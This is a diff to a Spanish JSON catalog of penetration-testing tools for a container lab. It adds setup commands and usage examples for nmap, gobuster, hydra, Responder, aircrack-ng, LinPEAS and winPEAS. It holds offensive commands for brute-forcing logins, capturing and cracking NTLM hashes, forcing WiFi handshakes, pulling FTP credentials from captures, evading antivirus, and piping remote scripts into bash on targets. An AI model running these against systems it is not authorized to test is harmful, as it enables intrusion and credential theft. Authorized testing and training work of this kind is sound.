@@ -1,6 +1,63 @@
 {
   "tools": [
     {
+      "name": "wordlists-setup",
+      "category": "Setup",
+      "level": 1,
+      "tags": [
+        "wordlists",
+        "rockyou",
+        "seclists",
+        "dirb",
+        "setup",
+        "inicial"
+      ],
+      "description": "Instala y prepara las wordlists esenciales en el contenedor. Muchas herramientas (gobuster, ffuf, hydra, john) las necesitan. Ejecuta esto una sola vez al iniciar el contenedor.",
+      "when_to_use": "La primera vez que uses el contenedor, antes de usar cualquier herramienta que requiera wordlists.",
+      "output_guide": "Cuando termine, /usr/share/wordlists/rockyou.txt y /usr/share/wordlists/dirb/ deben existir.",
+      "chain": [
+        "gobuster",
+        "ffuf",
+        "hydra",
+        "john",
+        "hashcat",
+        "feroxbuster"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Fix completo: permisos .config + wordlists + dirs necesarios",
+          "cmd": "sudo chown -R $(id -u):$(id -g) ~/.config 2>/dev/null || true; mkdir -p ~/.config/ffuf/scraper ~/.config/nuclei ~/.config/uncover ~/.config/wfuzz ~/.config/wireshark; sudo apt update && sudo apt install -y wordlists dirb seclists 2>/dev/null; sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true; echo 'Setup completado'",
+          "level": 1
+        },
+        {
+          "desc": "Solo fix de permisos .config (si hay Permission denied en ffuf/wfuzz/nuclei)",
+          "cmd": "sudo chown -R $(id -u):$(id -g) ~/.config 2>/dev/null || true; mkdir -p ~/.config/ffuf/scraper ~/.config/nuclei ~/.config/uncover ~/.config/wfuzz ~/.config/wireshark",
+          "level": 1
+        },
+        {
+          "desc": "Solo wordlists básicas (rockyou + dirb)",
+          "cmd": "sudo apt install -y wordlists dirb && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true",
+          "level": 1
+        },
+        {
+          "desc": "Verificar rockyou.txt",
+          "cmd": "ls -lh /usr/share/wordlists/rockyou.txt 2>/dev/null || echo 'NO EXISTE — instala wordlists primero'",
+          "level": 1
+        },
+        {
+          "desc": "SecLists completas (~900MB)",
+          "cmd": "sudo apt install -y seclists",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "Si rockyou.txt.gz no existe tras instalar wordlists: busca con 'find /usr/share/wordlists -name \"*.gz\"'",
+        "SecLists ocupa ~900MB descomprimidas. Si no tienes espacio, instala solo dirb: sudo apt install -y dirb"
+      ],
+      "install_cmd": "sudo chown -R $(id -u):$(id -g) ~/.config 2>/dev/null || true; mkdir -p ~/.config/ffuf/scraper ~/.config/nuclei ~/.config/uncover ~/.config/wfuzz ~/.config/wireshark; sudo apt update && sudo apt install -y wordlists dirb seclists; sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true; echo Setup completado"
+    },
+    {
       "name": "nmap",
       "category": "Recon",
       "level": 1,
@@ -80,18 +137,23 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Escanear un rango de red",
-          "cmd": "sudo netdiscover -r 192.168.1.0/24",
+          "desc": "Ver interfaz activa",
+          "cmd": "ip route | awk '/default/{print $5}'",
           "level": 1
         },
         {
-          "desc": "Modo pasivo — solo escucha ARP sin enviar nada",
-          "cmd": "sudo netdiscover -p -i eth0",
+          "desc": "Escanear red — detecta interfaz automáticamente",
+          "cmd": "sudo netdiscover -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -r 192.168.1.0/24",
+          "level": 1
+        },
+        {
+          "desc": "Modo pasivo en interfaz detectada",
+          "cmd": "sudo netdiscover -p -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0)",
           "level": 2
         }
       ],
       "troubleshooting": [
-        "Sin resultados: verifica tu interfaz con 'ip a' y que estés en la misma red.",
+        "Sin resultados: detecta tu interfaz de red con 'ip route | awk \"/default/{print $5}\"' y especifícala con -i.",
         "En modo pasivo tarda más: necesita que los hosts generen tráfico ARP naturalmente."
       ]
     },
@@ -152,25 +214,44 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Buscar con Google",
-          "cmd": "theHarvester -d {domain} -b google -l 500",
+          "desc": "Ver fuentes disponibles en esta instalación",
+          "cmd": "theHarvester -h 2>&1 | grep -i 'source\\|data source' | head -20",
           "level": 1
         },
         {
-          "desc": "Múltiples fuentes",
-          "cmd": "theHarvester -d {domain} -b bing,google,crtsh",
+          "desc": "crt.sh — certificados SSL (no requiere API, muy efectivo)",
+          "cmd": "theHarvester -d {domain} -b crtsh",
+          "level": 1
+        },
+        {
+          "desc": "HackerTarget — subdominios sin API key",
+          "cmd": "theHarvester -d {domain} -b hackertarget",
+          "level": 1
+        },
+        {
+          "desc": "Múltiples fuentes sin API key",
+          "cmd": "theHarvester -d {domain} -b crtsh,hackertarget,dnsdumpster,anubis,rapiddns",
           "level": 2
         },
         {
-          "desc": "Guardar en XML",
-          "cmd": "theHarvester -d {domain} -b all -f resultado",
+          "desc": "Guardar resultados en XML",
+          "cmd": "theHarvester -d {domain} -b crtsh,hackertarget -f resultado",
           "level": 2
+        },
+        {
+          "desc": "Con Shodan (requiere API key configurada)",
+          "cmd": "theHarvester -d {domain} -b shodan",
+          "level": 3
         }
       ],
       "troubleshooting": [
-        "Sin resultados con Google: Google bloquea scraping. Prueba -b bing o -b crtsh.",
-        "Error de API: algunas fuentes requieren API key en /etc/theHarvester/api-keys.yaml"
-      ]
+        "Invalid source 'google' o 'bing': fueron removidos en versiones recientes. Usa crtsh o hackertarget.",
+        "Ver fuentes disponibles: theHarvester -h | grep -i source",
+        "Fuentes sin API key: crtsh, hackertarget, dnsdumpster, anubis, rapiddns",
+        "Para Shodan: configura API key en /etc/theHarvester/api-keys.yaml"
+      ],
+      "install_cmd": "sudo apt install -y theharvester",
+      "binary_name": "theHarvester"
     },
     {
       "name": "gobuster",
@@ -196,8 +277,13 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Enumerar directorios",
+          "desc": "Enumerar directorios (instala wordlists si falta)",
           "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
+          "level": 1
+        },
+        {
+          "desc": "Con wordlist de SecLists (más completa)",
+          "cmd": "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt",
           "level": 1
         },
         {
@@ -222,10 +308,11 @@
         }
       ],
       "troubleshooting": [
-        "Muchos falsos positivos: añade -b 404,403 o --exclude-length.",
-        "SecLists no encontrado: sudo apt install seclists",
-        "Muy lento: sube threads con -t 50."
-      ]
+        "Wordlist no encontrada: instala con 'sudo apt install -y wordlists' y descomprime con 'sudo gzip -d /usr/share/wordlists/rockyou.txt.gz'.",
+        "Si dirb/common.txt no existe: sudo apt install -y dirb — incluye las wordlists de dirb.",
+        "Alternativa rápida: sudo apt install -y seclists — incluye cientos de wordlists en /usr/share/seclists/"
+      ],
+      "install_cmd": "sudo apt install -y gobuster dirb wordlists seclists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true"
     },
     {
       "name": "ffuf",
@@ -249,22 +336,27 @@
       "installed": true,
       "examples": [
         {
+          "desc": "Fix permisos ffuf (si hay Permission denied)",
+          "cmd": "sudo chown -R $(id -u):$(id -g) ~/.config/ffuf 2>/dev/null; mkdir -p ~/.config/ffuf/scraper",
+          "level": 1
+        },
+        {
           "desc": "Fuzz de directorios básico",
           "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
           "level": 1
         },
         {
-          "desc": "Filtrando 404 y respuestas vacías",
-          "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -fs 0",
+          "desc": "Con SecLists filtrando 404",
+          "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -fs 0",
           "level": 2
         },
         {
-          "desc": "Fuzz de parámetro GET",
+          "desc": "Fuzz parámetro GET",
           "cmd": "ffuf -u 'http://{target}/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
           "level": 2
         },
         {
-          "desc": "Fuzz POST",
+          "desc": "Fuzz POST login",
           "cmd": "ffuf -u http://{target}/login -X POST -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fc 401",
           "level": 2
         },
@@ -275,10 +367,11 @@
         }
       ],
       "troubleshooting": [
-        "Muchos resultados: -fs {tamaño_de_error}",
-        "Rate limiting: baja con -rate 10",
-        "No instalado: sudo apt install ffuf"
-      ]
+        "Permission denied en .config/ffuf: ejecuta el primer ejemplo 'Fix permisos ffuf'.",
+        "scraper not found: mkdir -p ~/.config/ffuf/scraper",
+        "Wordlist no encontrada: sudo apt install -y wordlists dirb seclists"
+      ],
+      "install_cmd": "mkdir -p ~/.config/ffuf/scraper 2>/dev/null || sudo mkdir -p ~/.config/ffuf/scraper && sudo chown -R $(id -u):$(id -g) ~/.config/ffuf && sudo apt install -y ffuf"
     },
     {
       "name": "nikto",
@@ -410,7 +503,7 @@
       "examples": [
         {
           "desc": "Iniciar Burp Suite (requiere GUI)",
-          "cmd": "burpsuite &",
+          "cmd": "burpsuite",
           "level": 1
         },
         {
@@ -425,9 +518,12 @@
         }
       ],
       "troubleshooting": [
-        "No intercepta HTTPS: instala el cert CA de Burp en el navegador.",
-        "Sin GUI: usa mitmproxy como alternativa desde terminal."
-      ]
+        "Requiere entorno gráfico (DISPLAY). Si la terminal se cierra inmediatamente, verifica que tienes X11/Wayland forwarding activo.",
+        "Verifica que DISPLAY esté configurado: echo $DISPLAY — debe mostrar ':0' o similar.",
+        "En Distrobox el DISPLAY del host se hereda automáticamente. Si falla: distrobox enter dockshade -- env DISPLAY=:0 burpsuite",
+        "Alternativa sin GUI: usa mitmproxy (sudo apt install -y mitmproxy) que funciona desde terminal."
+      ],
+      "install_cmd": "sudo apt install -y burpsuite"
     },
     {
       "name": "wfuzz",
@@ -451,25 +547,37 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Fuzz de directorios ocultando 404",
+          "desc": "Fix permisos wfuzz (si hay Permission denied)",
+          "cmd": "sudo chown -R $(id -u):$(id -g) ~/.config/wfuzz 2>/dev/null; mkdir -p ~/.config/wfuzz",
+          "level": 1
+        },
+        {
+          "desc": "Verificar que funciona",
+          "cmd": "wfuzz --help 2>&1 | head -3",
+          "level": 1
+        },
+        {
+          "desc": "Fuzz de directorios",
           "cmd": "wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt http://{target}/FUZZ",
           "level": 1
         },
         {
-          "desc": "Fuzz de parámetro GET",
-          "cmd": "wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt 'http://{target}/page?id=FUZZ'",
+          "desc": "Fuzz parámetro GET",
+          "cmd": "wfuzz -c --hc 404 -w /usr/share/seclists/Discovery/Web-Content/common.txt 'http://{target}/page?id=FUZZ'",
           "level": 2
         },
         {
-          "desc": "Fuzz de dos parámetros simultáneos",
+          "desc": "Fuzz dos parámetros simultáneos",
           "cmd": "wfuzz -c --hc 404 -w users.txt -w passwords.txt 'http://{target}/login?user=FUZZ&pass=FUZ2Z'",
           "level": 3
         }
       ],
       "troubleshooting": [
-        "Demasiado ruido: usa --hh o --hl para filtrar respuestas del mismo tamaño.",
-        "Lento: sube threads con -t 20."
-      ]
+        "Permission denied en .config/wfuzz: ejecuta el primer ejemplo 'Fix permisos wfuzz'.",
+        "No module named pkg_resources: sudo apt install -y python3-setuptools",
+        "pycurl/openssl warning: es inofensivo para HTTP. Para HTTPS: sudo apt install -y python3-pycurl"
+      ],
+      "install_cmd": "mkdir -p ~/.config/wfuzz 2>/dev/null || sudo mkdir -p ~/.config/wfuzz && sudo chown -R $(id -u):$(id -g) ~/.config/wfuzz && sudo apt install -y wfuzz python3-setuptools"
     },
     {
       "name": "metasploit",
@@ -529,7 +637,8 @@
         "No session created: LHOST es TU IP, no la del target.",
         "PostgreSQL no inicia: systemctl start postgresql antes de msfconsole.",
         "Payload bloqueado por AV: usa encoder con msfvenom -e x86/shikata_ga_nai -i 5"
-      ]
+      ],
+      "install_cmd": "sudo apt install -y metasploit-framework"
     },
     {
       "name": "searchsploit",
@@ -581,7 +690,8 @@
       "troubleshooting": [
         "Muchos resultados: sé más específico. 'apache 2.4.49' en lugar de 'apache'.",
         "BD desactualizada: searchsploit -u para sincronizar."
-      ]
+      ],
+      "install_cmd": "sudo apt install -y exploitdb && searchsploit -u"
     },
     {
       "name": "hydra",
@@ -633,10 +743,12 @@
         }
       ],
       "troubleshooting": [
+        "rockyou.txt no existe: sudo apt install -y wordlists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz",
         "Muy lento en SSH: máximo -t 4. Más threads = más bloqueos.",
-        "HTTP POST no funciona: 'F=Invalid' debe coincidir exactamente con el texto de error.",
-        "IP bloqueada: usa -W para añadir delay."
-      ]
+        "HTTP POST no funciona: 'F=Invalid' debe coincidir exactamente con el texto de error de login.",
+        "IP bloqueada: usa -W para añadir delay entre intentos."
+      ],
+      "install_cmd": "sudo apt install -y hydra wordlists dirb && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true"
     },
     {
       "name": "john",
@@ -686,10 +798,12 @@
         }
       ],
       "troubleshooting": [
+        "rockyou.txt no existe: sudo apt install -y wordlists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz",
         "Hash no identificado: usa hash-identifier primero.",
-        "Ya crackeado: john guarda resultados. Usa --show.",
+        "Ya crackeado antes: john guarda resultados. Usa --show.",
         "Muy lento en bcrypt: usa hashcat con GPU."
-      ]
+      ],
+      "install_cmd": "sudo apt install -y john wordlists dirb && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true"
     },
     {
       "name": "hashcat",
@@ -740,9 +854,11 @@
         }
       ],
       "troubleshooting": [
+        "rockyou.txt no existe: sudo apt install -y wordlists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz",
         "Sin GPU en VM/contenedor: usa --force para CPU (más lento).",
         "Device not found: instala drivers de GPU o usa hashcat en el host."
-      ]
+      ],
+      "install_cmd": "sudo apt install -y hashcat wordlists dirb && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true"
     },
     {
       "name": "aircrack-ng",
@@ -765,12 +881,17 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Paso 1: modo monitor",
+          "desc": "Paso 0: ver interfaces WiFi disponibles",
+          "cmd": "iwconfig 2>/dev/null || ip link show",
+          "level": 1
+        },
+        {
+          "desc": "Paso 1: poner tarjeta en modo monitor (reemplaza wlan0 con tu interfaz)",
           "cmd": "sudo airmon-ng start wlan0",
           "level": 1
         },
         {
-          "desc": "Paso 2: listar redes",
+          "desc": "Paso 2: listar redes WiFi",
           "cmd": "sudo airodump-ng wlan0mon",
           "level": 1
         },
@@ -785,16 +906,19 @@
           "level": 2
         },
         {
-          "desc": "Paso 5: crackear handshake",
+          "desc": "Paso 5: crackear handshake con wordlist",
           "cmd": "aircrack-ng captura.cap -w /usr/share/wordlists/rockyou.txt",
           "level": 1
         }
       ],
       "troubleshooting": [
+        "rockyou.txt no existe: sudo apt install -y wordlists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz",
+        "Interfaz no encontrada: detecta la interfaz WiFi real con 'ip link show' o 'iwconfig'. Reemplaza wlan0 con el nombre real.",
+        "En distrobox/VM: necesitas un adaptador USB WiFi pasado al contenedor con '--device /dev/bus/usb'.",
         "No captura handshake: usa aireplay-ng --deauth para forzarlo.",
-        "Tarjeta sin modo monitor: necesitas chipset Atheros, Ralink o similar.",
-        "En VM: necesitas adaptador USB WiFi pasado directamente."
-      ]
+        "Tarjeta sin modo monitor: necesitas chipset Atheros, Ralink o similar."
+      ],
+      "install_cmd": "sudo apt install -y aircrack-ng wordlists dirb && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true"
     },
     {
       "name": "wireshark",
@@ -818,30 +942,51 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Iniciar con GUI",
-          "cmd": "wireshark &",
+          "desc": "Paso 0: fix de permisos (ejecutar una vez si hay error de permission denied)",
+          "cmd": "mkdir -p ~/.config/wireshark && sudo chown -R $USER:$USER ~/.config/wireshark && sudo setcap cap_net_raw,cap_net_admin=eip $(which dumpcap)",
           "level": 1
         },
         {
-          "desc": "Capturar desde terminal (tshark)",
-          "cmd": "tshark -i eth0 -w captura.pcap",
+          "desc": "Iniciar Wireshark GUI",
+          "cmd": "wireshark",
           "level": 1
         },
         {
-          "desc": "Filtrar HTTP en pcap",
+          "desc": "Ver interfaces de red disponibles",
+          "cmd": "ip link show",
+          "level": 1
+        },
+        {
+          "desc": "Capturar con tshark en interfaz detectada automáticamente",
+          "cmd": "sudo tshark -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -w captura.pcap",
+          "level": 1
+        },
+        {
+          "desc": "Capturar en interfaz específica",
+          "cmd": "sudo tshark -i wlp1s0 -w captura.pcap",
+          "level": 2
+        },
+        {
+          "desc": "Filtrar HTTP en archivo pcap existente",
           "cmd": "tshark -r captura.pcap -Y 'http' -V",
           "level": 2
         },
         {
-          "desc": "Extraer credenciales FTP",
+          "desc": "Extraer credenciales FTP de captura",
           "cmd": "tshark -r captura.pcap -Y 'ftp' -T fields -e ftp.request.arg",
           "level": 2
         }
       ],
       "troubleshooting": [
-        "No captura sin root: sudo usermod -aG wireshark $USER",
-        "Sin GUI: usa tshark que viene incluido."
-      ]
+        "Permission denied en .config/wireshark: ejecuta el 'Paso 0' del primer ejemplo — cambia el dueño del directorio.",
+        "CAP_NET_RAW required: ejecuta 'sudo setcap cap_net_raw,cap_net_admin=eip $(which dumpcap)' dentro del contenedor.",
+        "dpkg error (1) al instalar: es porque apt intentó crear ~/.config/wireshark como root. Fix: mkdir -p ~/.config/wireshark antes de instalar.",
+        "QDBus warning al abrir: es un warning inofensivo de Wayland/portal, no afecta el funcionamiento.",
+        "Para capturar en tu WiFi real (wlp1s0): verifica con 'ip link show' y usa ese nombre en tshark -i.",
+        "Captura sin sudo: sudo usermod -aG wireshark $USER dentro del contenedor, luego sal y vuelve a entrar.",
+        "wireshark & no funciona desde DockShade: usa 'wireshark' sin & — DockShade ya lo lanza en terminal nueva."
+      ],
+      "install_cmd": "sudo apt install -y wireshark tshark && mkdir -p ~/.config/wireshark && sudo chown -R $USER:$USER ~/.config/wireshark && sudo dpkg-reconfigure wireshark-common && sudo usermod -aG wireshark $USER && sudo setcap cap_net_raw,cap_net_admin=eip $(which dumpcap) && echo 'Reinicia la sesión del contenedor para aplicar el grupo wireshark'"
     },
     {
       "name": "tcpdump",
@@ -864,30 +1009,37 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Capturar en eth0",
-          "cmd": "sudo tcpdump -i eth0",
+          "desc": "Ver interfaces de red disponibles",
+          "cmd": "ip link show",
+          "level": 1
+        },
+        {
+          "desc": "Capturar en interfaz detectada automáticamente",
+          "cmd": "sudo tcpdump -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0)",
           "level": 1
         },
         {
           "desc": "Guardar a pcap",
-          "cmd": "sudo tcpdump -i eth0 -w captura.pcap",
+          "cmd": "sudo tcpdump -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -w captura.pcap",
           "level": 1
         },
         {
           "desc": "Filtrar por host",
-          "cmd": "sudo tcpdump -i eth0 host {target}",
+          "cmd": "sudo tcpdump -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) host {target}",
           "level": 1
         },
         {
           "desc": "Ver tráfico HTTP en ASCII",
-          "cmd": "sudo tcpdump -i eth0 -A 'tcp port 80'",
+          "cmd": "sudo tcpdump -i $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -A 'tcp port 80'",
           "level": 2
         }
       ],
       "troubleshooting": [
-        "Permiso denegado: necesitas sudo o grupo pcap.",
-        "Interfaz incorrecta: lista con 'ip a' o usa -i any."
-      ]
+        "Interfaz incorrecta: detecta la interfaz activa con 'ip route | awk \"/default/{print $5}\"' o lista con 'ip link show'.",
+        "Permiso denegado: necesitas sudo o pertenecer al grupo pcap.",
+        "En contenedor sin red propia: usa la interfaz del host que Distrobox comparte (generalmente eth0 o la que aparece en 'ip link')."
+      ],
+      "install_cmd": "sudo apt install -y tcpdump"
     },
     {
       "name": "netcat",
@@ -1013,25 +1165,33 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Modo activo (captura hashes)",
-          "cmd": "sudo responder -I eth0 -wF",
+          "desc": "Ver interfaz activa antes de lanzar",
+          "cmd": "ip route | awk '/default/{print $5}'",
+          "level": 1
+        },
+        {
+          "desc": "Modo activo en interfaz detectada",
+          "cmd": "sudo responder -I $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -wF",
           "level": 2
         },
         {
           "desc": "Modo análisis — solo escucha",
-          "cmd": "sudo responder -I eth0 -A",
+          "cmd": "sudo responder -I $(ip route 2>/dev/null | awk '/default/{print $5}' | head -1 || echo eth0) -A",
           "level": 2
         },
         {
-          "desc": "Crackear NTLMv2 capturados",
+          "desc": "Crackear hashes NTLMv2 capturados",
           "cmd": "hashcat -m 5600 /usr/share/responder/logs/NTLMv2-SSP-{target}.txt /usr/share/wordlists/rockyou.txt",
           "level": 3
         }
       ],
       "troubleshooting": [
+        "Interfaz incorrecta: detecta la interfaz activa con 'ip route | awk \"/default/{print $5}\"' y úsala en -I.",
         "No captura nada: verifica estar en la misma LAN que los hosts Windows.",
-        "Conflicto de puertos: para los servidores HTTP/HTTPS si ya tienes algo en esos puertos."
-      ]
+        "Conflicto de puertos: usa -P para deshabilitar servicios que ya están ocupados.",
+        "En contenedor: Distrobox comparte la red del host, responder puede ver el tráfico de la LAN."
+      ],
+      "install_cmd": "sudo apt install -y responder"
     },
     {
       "name": "netexec",
@@ -1107,28 +1267,34 @@
         "metasploit",
         "netcat"
       ],
-      "installed": false,
-      "install_cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
+      "installed": true,
+      "install_cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o ~/linpeas.sh && echo 'linpeas descargado en ~/linpeas.sh'",
       "examples": [
         {
-          "desc": "Descargar y ejecutar directamente",
+          "desc": "Descargar linpeas.sh al directorio actual",
+          "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh",
+          "level": 1
+        },
+        {
+          "desc": "Ejecutar directamente desde internet",
           "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
           "level": 1
         },
         {
-          "desc": "Transferir con netcat desde tu máquina",
-          "cmd": "nc -lvnp 8888 < linpeas.sh",
+          "desc": "Ejecutar y guardar output con colores",
+          "cmd": "bash linpeas.sh | tee /tmp/linpeas_out.txt",
           "level": 2
         },
         {
-          "desc": "Ejecutar y guardar output",
-          "cmd": "bash linpeas.sh | tee /tmp/linpeas_output.txt",
+          "desc": "Transferir al target via netcat (desde tu máquina)",
+          "cmd": "nc -lvnp 8888 < linpeas.sh",
           "level": 2
         }
       ],
       "troubleshooting": [
+        "linpeas no se detecta como instalado: es un script descargable, no un paquete apt. Usa los ejemplos para descargarlo.",
         "Sin internet en el target: descarga en tu máquina y transfiere con netcat o python http.server.",
-        "AV bloqueando: renombra el script o modifica las primeras líneas."
+        "Curl falla: verifica conectividad con 'curl -I https://github.com'"
       ]
     },
     {
@@ -1149,28 +1315,34 @@
       "chain": [
         "metasploit"
       ],
-      "installed": false,
-      "install_cmd": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
+      "installed": true,
+      "install_cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o ~/winpeas.exe && echo 'winpeas descargado en ~/winpeas.exe'",
       "examples": [
         {
-          "desc": "Ejecutar en Windows",
+          "desc": "Descargar winPEASx64.exe al directorio actual",
+          "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe",
+          "level": 1
+        },
+        {
+          "desc": "En Windows: ejecutar directamente",
           "cmd": "winPEASx64.exe",
           "level": 1
         },
         {
-          "desc": "Solo contraseñas guardadas",
+          "desc": "En Windows: solo contraseñas guardadas",
           "cmd": "winPEASx64.exe windowscreds",
           "level": 2
         },
         {
-          "desc": "Guardar output",
-          "cmd": "winPEASx64.exe > C:\\Windows\\Temp\\output.txt",
+          "desc": "Transferir desde Kali via HTTP server",
+          "cmd": "python3 -m http.server 80",
           "level": 2
         }
       ],
       "troubleshooting": [
-        "Bloqueado por Defender: usa winPEAS.bat como alternativa.",
-        "Para transferir: python3 -m http.server 80 en Kali, luego certutil -urlcache -split -f http://{ip}/winPEASx64.exe en Windows."
+        "winpeas no se detecta como instalado: es un script descargable, no un paquete apt. Usa los ejemplos para descargarlo.",
+        "Sin internet en el target: descarga en tu máquina y transfiere con netcat o python http.server.",
+        "Curl falla: verifica conectividad con 'curl -I https://github.com'"
       ]
     },
     {
@@ -1192,10 +1364,15 @@
         "john",
         "hashcat"
       ],
-      "installed": true,
+      "installed": false,
       "examples": [
         {
-          "desc": "Identificar el SO del volcado",
+          "desc": "Verificar instalación",
+          "cmd": "volatility3 --help 2>&1 | head -5",
+          "level": 1
+        },
+        {
+          "desc": "Identificar SO del volcado",
           "cmd": "volatility3 -f {hash} windows.info",
           "level": 2
         },
@@ -1221,9 +1398,12 @@
         }
       ],
       "troubleshooting": [
-        "volatility vs volatility3: Kali moderno usa vol3. La sintaxis es diferente.",
-        "Perfil no detectado: vol3 lo detecta automáticamente, no necesitas especificarlo."
-      ]
+        "Unable to locate package python3-volatility3: el paquete en Kali se llama 'volatility3'. Prueba: sudo apt install -y volatility3",
+        "Si tampoco funciona: pip3 install volatility3 --break-system-packages",
+        "volatility vs volatility3: Kali moderno usa vol3. La sintaxis es diferente a vol2.",
+        "Perfil no necesario en vol3: lo detecta automáticamente."
+      ],
+      "install_cmd": "sudo apt install -y volatility3 2>/dev/null || sudo apt install -y python3-volatility3 2>/dev/null || pip3 install volatility3 --break-system-packages"
     },
     {
       "name": "binwalk",
@@ -1287,24 +1467,25 @@
       "installed": true,
       "examples": [
         {
-          "desc": "Extraer datos ocultos",
-          "cmd": "steghide extract -sf imagen.jpg",
+          "desc": "Extraer datos ocultos de imagen",
+          "cmd": "steghide extract -sf {image_file}",
           "level": 1
         },
         {
-          "desc": "Ver info sin extraer",
-          "cmd": "steghide info imagen.jpg",
+          "desc": "Ver info de imagen sin extraer",
+          "cmd": "steghide info {image_file}",
           "level": 1
         },
         {
           "desc": "Ocultar archivo en imagen",
-          "cmd": "steghide embed -cf imagen.jpg -ef secreto.txt -p {hash}",
+          "cmd": "steghide embed -cf {image_file} -ef secreto.txt -p {hash}",
           "level": 2
         }
       ],
       "troubleshooting": [
         "Passphrase incorrecta: prueba la contraseña del CTF, nombres del challenge, o usa stegcracker.",
-        "Formato no soportado: steghide solo soporta JPEG, BMP, WAV, AU. Para PNG usa zsteg."
+        "Formato no soportado: steghide solo soporta JPEG, BMP, WAV, AU. Para PNG usa zsteg (sudo apt install ruby-zsteg).",
+        "El archivo de imagen puede tener cualquier nombre — el parámetro -sf acepta cualquier ruta."
       ]
     },
     {
@@ -1405,7 +1586,8 @@
       "troubleshooting": [
         "Demasiado output: siempre usa pipe con grep.",
         "No encuentra nada útil: el binario puede estar empaquetado. Prueba binwalk primero."
-      ]
+      ],
+      "install_cmd": "sudo apt install -y binutils"
     },
     {
       "name": "nuclei",
@@ -1428,8 +1610,18 @@
         "metasploit"
       ],
       "installed": false,
-      "install_cmd": "sudo apt install nuclei && nuclei -update-templates",
+      "install_cmd": "mkdir -p ~/.config/nuclei ~/.config/uncover 2>/dev/null || (sudo mkdir -p ~/.config/nuclei ~/.config/uncover && sudo chown -R $(id -u):$(id -g) ~/.config/nuclei ~/.config/uncover) && sudo apt install -y nuclei && nuclei -update-templates 2>/dev/null || true",
       "examples": [
+        {
+          "desc": "Fix permisos nuclei (si hay Permission denied)",
+          "cmd": "sudo chown -R $(id -u):$(id -g) ~/.config/nuclei ~/.config/uncover 2>/dev/null; mkdir -p ~/.config/nuclei ~/.config/uncover",
+          "level": 1
+        },
+        {
+          "desc": "Actualizar templates",
+          "cmd": "nuclei -update-templates",
+          "level": 1
+        },
         {
           "desc": "Scan básico",
           "cmd": "nuclei -u http://{target}",
@@ -1441,24 +1633,19 @@
           "level": 1
         },
         {
-          "desc": "Solo CVEs",
+          "desc": "Solo CVEs conocidos",
           "cmd": "nuclei -u http://{target} -tags cve",
           "level": 2
         },
         {
-          "desc": "Solo misconfigurations",
+          "desc": "Misconfigurations",
           "cmd": "nuclei -u http://{target} -tags misconfig",
           "level": 2
-        },
-        {
-          "desc": "Actualizar templates",
-          "cmd": "nuclei -update-templates",
-          "level": 1
         }
       ],
       "troubleshooting": [
-        "No instalado: sudo apt install nuclei && nuclei -update-templates",
-        "Muchos falsos positivos: especifica tags concretos."
+        "Permission denied en .config/nuclei: ejecuta el primer ejemplo 'Fix permisos nuclei'.",
+        "Templates no actualizan: nuclei -update-templates (requiere internet en el contenedor)."
       ]
     },
     {
@@ -1482,11 +1669,16 @@
         "ffuf"
       ],
       "installed": false,
-      "install_cmd": "sudo apt install feroxbuster",
+      "install_cmd": "sudo apt install -y feroxbuster wordlists dirb seclists && sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true",
       "examples": [
         {
           "desc": "Scan recursivo básico",
           "cmd": "feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
